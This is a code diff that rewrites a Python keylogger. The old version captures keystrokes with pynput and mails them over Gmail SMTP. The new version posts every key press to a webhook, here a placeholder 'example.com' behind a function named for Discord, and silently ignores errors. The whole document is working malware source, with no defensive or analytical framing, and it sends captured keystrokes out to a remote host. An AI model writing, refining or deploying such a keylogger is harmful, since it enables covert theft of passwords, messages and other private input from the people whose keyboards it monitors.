@@ -1,36 +1,19 @@
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from pynput.keyboard import Listener
+import requests
+from pynput import keyboard
+import os
 
-your_email = "your_email@example.com"
-your_password = "password123"
-recipient_email = "recipient@example.com"
-msg = MIMEMultipart()
+webhook_url = "example.com"
 
-try:
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.ehlo()
-    server.login(your_email, your_password)
-    
-    # Send email
-    server.send_message(msg)
-    print("Email sent successfully!")
-    
-    server.close()
-except Exception as e:
-    print(f"Error sending email: {e}")
-
-def key_stroke(key):
-    key = str(key).replace('\'', '')
-    
-    msg['From'] = your_email
-    msg['To'] = recipient_email
-    msg['Subject'] = key + '\n'
+def send_to_discord(key):
+    try:
+        key_str = key.char if hasattr(key, 'char') else str(key)
+        payload = {"content": f"Key pressed: `{key_str}`"}
+        requests.post(webhook_url, json=payload, timeout=5)
+    except Exception:
+        pass
 
 def start_logging():
-    with Listener(on_press=key_stroke) as listener:
-        listener.join
+    with keyboard.Listener(on_press=send_to_discord) as listener:
+        listener.join()
 
-if __name__ == "__main__":
-    start_logging()
+start_logging()
